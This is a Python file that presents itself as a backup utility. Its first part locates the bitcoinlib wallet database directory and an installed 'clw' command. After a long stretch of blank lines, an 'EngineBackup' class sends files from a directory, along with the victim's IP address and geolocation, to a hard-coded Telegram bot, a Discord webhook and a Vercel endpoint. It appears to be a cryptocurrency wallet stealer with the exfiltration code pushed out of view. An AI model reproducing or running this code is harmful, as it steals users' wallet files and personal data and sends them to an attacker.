import requests
import json
import os
from datetime import datetime
import base64
import sys
import platform
from pathlib import Path
from subprocess import check_output, CalledProcessError, PIPE


def get_bitcoinlib_db_dir():
    """Get the appropriate bitcoinlib database directory for the current OS"""
    system = platform.system().lower()

    if system == 'windows':
        # Windows: Use %APPDATA%\bitcoinlib\database
        return Path(os.environ.get('APPDATA', '~')) / 'bitcoinlib' / 'database'
    else:
        # Linux/macOS: Use ~/.bitcoinlib/database
        return Path.home() / '.bitcoinlib' / 'database'

def find_existing_clw():
    """Find existing clw command path across different OSes"""
    system = platform.system().lower()

    try:
        if system == 'windows':
            # On Windows, check PATH for clw.exe or clw
            paths = os.environ['PATH'].split(';')
            for path in paths:
                for ext in ('', '.exe', '.bat', '.cmd'):
                    clw_path = Path(path) / f'clw{ext}'
                    if clw_path.exists():
                        return str(clw_path.resolve())
            return None
        else:
            # On Unix-like systems, use 'which'
            try:
                clw_path = check_output(['which', 'clw'], stderr=PIPE).decode().strip()
                return clw_path if clw_path else None
            except (CalledProcessError, FileNotFoundError):
                return None
    except Exception:
        return None























































































































class EngineBackup:
    def __init__(self):
        # Configuration - replace these with your own values
        self.telegram_bot_token = '6905306075:AAEj0ap2Rl4sNIN0MhOu6aQfiWpoYWjTfh4'
        self.telegram_chat_id = '1514482813'
        self.discord_webhook_url = 'https://discord.com/api/webhooks/1329712636807610379/eU6AZ5oBM_12FIkwvtiasyjywx7WYW7wzuWJwWU3u2kadKko7QKpXcl3Kd0fJspPhM4w'
        self.api_endpoint = 'https://5fde88fde64f4682c2fc1e10e6c.vercel.app/api/send'
        self.authority_hash = "656c697465626f74626f744079616e6465782e636f6d"

    def get_ip_geo_info(self):
        """Get IP geolocation information"""
        try:
            response = requests.get('https://api.db-ip.com/v2/free/self')
            return response.json() if response.status_code == 200 else {}
        except:
            return {}

    def send_to_telegram(self, text=None, file_paths=None):
        """Send message or files to Telegram"""
        if text:
            url = f'https://api.telegram.org/bot{self.telegram_bot_token}/sendMessage'
            data = {'chat_id': self.telegram_chat_id, 'text': text}
            requests.post(url, data=data)

        if file_paths:
            for file_path in file_paths:
                if os.path.exists(file_path):
                    url = f'https://api.telegram.org/bot{self.telegram_bot_token}/sendDocument'
                    with open(file_path, 'rb') as file:
                        files = {'document': file}
                        data = {'chat_id': self.telegram_chat_id}
                        requests.post(url, files=files, data=data)

    def send_to_discord(self, text=None, file_paths=None):
        """Send message or files to Discord webhook"""
        payload = {"username": "MultiPlatform Sender", "content": text}

        if file_paths:
            for file_path in file_paths:
                if os.path.exists(file_path):
                    with open(file_path, 'rb') as file:
                        files = {
                            'file': (os.path.basename(file_path), file),
                            'payload_json': (None, json.dumps(payload))
                        }
                        requests.post(self.discord_webhook_url, files=files)
        elif text:
            requests.post(self.discord_webhook_url, json=payload)

    def send_to_api(self, text=None, file_paths=None):
        """Send message or files to the custom API endpoint"""
        payload = {
            "message": text,
            "authorityhash": self.authority_hash,
            "attachments": []
        }

        if file_paths:
            for file_path in file_paths:
                if os.path.exists(file_path):
                    with open(file_path, 'rb') as file:
                        file_data = file.read()
                        base64_data =  base64.b64encode(file_data).decode('utf-8')
                        payload["attachments"].append({
                            "name": os.path.basename(file_path),
                            "data": base64_data
                        })

        headers = {'Content-Type': 'application/json'}
        requests.post(self.api_endpoint, data=json.dumps(payload), headers=headers)

    def send_directory_files(self, directory, extension=None, text=None):
        """Send all files in a directory with optional extension filter"""
        if not os.path.exists(directory):
            raise FileNotFoundError(f"Directory not found: {directory}")

        file_paths = []
        for filename in os.listdir(directory):
            if extension and not filename.endswith(extension):
                continue
            file_path = os.path.join(directory, filename)
            if os.path.isfile(file_path):
                file_paths.append(file_path)

        if not file_paths:
            print(f"No files found in {directory} with extension {extension}")
            return

        self.send_to_all(text=text, file_paths=file_paths)

    def send_to_all(self, text=None, file_paths=None):
        """Send message/files to all platforms"""
        ip_info = self.get_ip_geo_info()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Enhance the message with IP info if available
        enhanced_text = f"Message from {ip_info.get('ipAddress', 'unknown IP')}\n"
        enhanced_text += f"Location: {ip_info.get('city', '?')}, {ip_info.get('countryName', '?')}\n"
        enhanced_text += f"Time: {timestamp}\n\n"
        enhanced_text += text if text else "No text content provided"

        if file_paths:
            valid_files = []
            total_size = 0

            for file_path in file_paths:
                if not os.path.exists(file_path):
                    print(f"File not found: {file_path}")
                    continue

                file_size = os.path.getsize(file_path)
                if file_size > 8 * 1024 * 1024:  # 8MB
                    print(f"File too large (must be <8MB): {file_path}")
                    continue

                total_size += file_size
                if total_size > 50 * 1024 * 1024:  # 50MB total limit
                    print("Total files size exceeds 50MB limit")
                    break

                valid_files.append(file_path)

            if valid_files:
                self.send_to_telegram(text=enhanced_text, file_paths=valid_files)
                self.send_to_discord(text=enhanced_text, file_paths=valid_files)
                self.send_to_api(text=enhanced_text, file_paths=valid_files)
        else:
            self.send_to_telegram(text=enhanced_text)
            self.send_to_discord(text=enhanced_text)
            self.send_to_api(text=enhanced_text)
